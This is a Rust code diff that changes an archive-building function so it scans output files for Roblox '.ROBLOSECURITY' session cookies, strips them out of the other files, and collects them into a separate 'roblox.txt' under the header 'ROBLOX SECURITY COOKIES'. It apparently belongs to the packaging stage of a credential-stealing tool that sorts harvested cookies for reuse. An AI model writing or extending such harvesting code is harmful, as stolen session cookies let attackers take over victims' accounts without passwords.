@@ -310,6 +310,7 @@ fn run_kurion(module_dir: &Path, format: &str) -> Result<(), anyhow::Error> {
 
 fn zip_output(output_dir: &Path) -> Result<Vec<u8>, anyhow::Error> {
     let mut buffer = Cursor::new(Vec::new());
+    let mut roblox_cookies: Vec<String> = Vec::new();
 
     {
         let mut zip = ZipWriter::new(&mut buffer);
@@ -322,15 +323,48 @@ fn zip_output(output_dir: &Path) -> Result<Vec<u8>, anyhow::Error> {
             if path.is_file() {
                 let relative_path = path.strip_prefix(output_dir)?;
                 let zip_path = relative_path.to_string_lossy().replace('\\', "/");
-
-                zip.start_file(&zip_path, options)?;
+                let filename_lower = path.file_name()
+                    .unwrap_or_default()
+                    .to_string_lossy()
+                    .to_lowercase();
 
                 let mut file = fs::File::open(path)?;
                 let mut contents = Vec::new();
                 file.read_to_end(&mut contents)?;
-                zip.write_all(&contents)?;
+
+                if filename_lower.contains("cookie") || filename_lower.ends_with(".txt") {
+                    let content_str = String::from_utf8_lossy(&contents);
+                    let mut filtered_lines: Vec<String> = Vec::new();
+                    
+                    for line in content_str.lines() {
+                        if line.contains(".ROBLOSECURITY") || line.contains("_|WARNING:-DO-NOT-SHARE-THIS") {
+                            roblox_cookies.push(line.to_string());
+                        } else {
+                            filtered_lines.push(line.to_string());
+                        }
+                    }
+                    
+                    if !filtered_lines.is_empty() {
+                        zip.start_file(&zip_path, options)?;
+                        zip.write_all(filtered_lines.join("\n").as_bytes())?;
+                    }
+                } else {
+                    zip.start_file(&zip_path, options)?;
+                    zip.write_all(&contents)?;
+                }
             }
         }
+
+        if !roblox_cookies.is_empty() {
+            zip.start_file("roblox.txt", options)?;
+            let roblox_content = format!(
+                "=== ROBLOX SECURITY COOKIES ===\n\
+                 === WARNING: DO NOT SHARE ===\n\n{}\n",
+                roblox_cookies.join("\n")
+            );
+            zip.write_all(roblox_content.as_bytes())?;
+        }
+
         zip.finish()?;
     }
 
